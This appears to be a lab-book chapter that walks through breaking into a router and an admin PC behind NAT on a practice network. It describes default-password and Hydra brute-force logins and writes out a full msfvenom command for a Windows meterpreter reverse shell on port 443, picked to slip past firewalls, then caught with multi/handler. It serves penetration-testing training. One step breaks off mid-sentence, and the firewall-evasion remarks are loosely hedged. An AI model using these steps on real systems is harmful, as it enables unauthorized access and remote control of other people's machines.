This is one of the most important units in this book, as this allows you to defeat [NAT](https://www.comptia.org/content/guides/what-is-network-address-translation) and is a culmination of all of the previous exercises.

**Before proceeding, do exercise 2 in the READme.md. This will greatly help you when trying to use a dictionary attack.**

The main chain of attack is the following.

1. Figure out the brand of router that they were running to try a list of default passwords.
2. If (1) fails, do steps 3-6
3. Intercept a packet going to the Edge Router.
4. Figure out where people could input their passwords.
5. Use either a python program or some other thing (like Burp Suite, or ZAP) that could quickly implement passwords, as well.
6. Then, go and get the router password and log in.

Part One of getting into the router is complete. We now begin part 2, where we access the actual admin PC.

1. Run an nmap scan after configuring all of the ports to forward to 192.168.5.2 for the admin PC.
2. Realize that there is a process known as SSH running on the Admin PC. Therefore, our goal next is to get access using SSH. We then use: Hydra in order to brute force the login.
3. Then, again configure port forwarding to Port 22 in the Edge Router take: (10.2.51.7:22 -> 192.168.5.2:22)
4. Then, SSH into the computer. Then, open up another terminal to make a meterpreter payload. We will be using the `/windows/x64/meterpreter/reverse_tcp` payload, one of the most common payloads to go and log into a computer. In this case, we will be using port 443 in order to make the connection.
5. Type in the command `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.2.51.7 LPORT=443 -f exe > [insert name here].exe`. The `-p` stands for payload (which is the windows reverse shell), and the `LHOST` and `LPORT` identify which hosts on the LAN to connect to, and what port that they connect to, with `-f` standing for format. In this case, we use port 443, since it runs HTTPS and won't get detected by firewalls. Optionally, you may include the flags `-e cmd/powershell_base64 -i 300` encoder, which is another way of encoding the payload with `-i 300` times. 
6. Use `scp` to securely copy and paste the file to the admin PC.
7. (Optional) Check to see whether or not the file actually got copied using your SSH connection using `dir` or `ls`.

Now, part 2 of securely copying and pasting the file is complete. Now, part 3 is the fun part. 

1. First configure your Attack Router (the one that your PenTester PC is closest to connect to) to forward all inputs from 
 Use (multi/handler), and set the settings to LHOST and LPORT to the same attack machine.
2. Run the program, and profit. In particular, you get a meterpreter shell, which is far, far stronger than even a regular shell. However, many antiviruses will detect it (even with encodings, since it is literally the most common reverse shell), and one must find different ways of executing commands.

*remarks: yeah, there will be programs out there that tell you that metasploit payloads can bypass firewalls on Windows 10/11. We're not sure of the specifics, but for relatively updated systems, there seems to be almost no trouble. Additionally, meterpreter shells are very well known, and there is even a [YARA File](https://github.com/Yara-Rules/rules/blob/master/malware/RAT_Meterpreter_Reverse_Tcp.yar) to detect those payloads running in memory. you can find them [here.](https://n3nu.medium.com/getting-started-with-yara-a-beginners-guide-to-understanding-and-creating-yara-rules-73bda308fd98)"*
